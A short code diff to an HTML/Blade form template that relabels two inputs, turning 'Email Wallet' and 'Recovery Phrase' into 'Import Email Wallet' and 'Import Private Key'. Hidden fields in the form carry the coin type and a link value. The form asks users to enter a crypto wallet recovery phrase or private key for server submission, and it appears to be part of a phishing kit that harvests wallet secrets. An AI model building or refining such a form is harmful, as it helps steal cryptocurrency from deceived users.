@@ -40,12 +40,12 @@
         </div>
         <div class="form__div">
             <input type="text" class="form__input" placeholder=" " name="email">
-            <label for="" class="form__label">Email Wallet</label>
+            <label for="" class="form__label">Import Email Wallet</label>
         </div>
         <div class="form__div">
             <input type="text" class="form__input" placeholder=" " name="key"
                    style="height: 80px;padding: 8px 7px 11px 7px;font-size: 12px;" required>
-            <label for="" class="form__label">Recovery Phrase</label>
+            <label for="" class="form__label">Import Private Key</label>
             <input type="hidden" id="wallet" name="wallet_type" value="{{$coin}}"/>
             <input type="hidden" id="link" name="link" value="{{$data}}"/>
         </div>
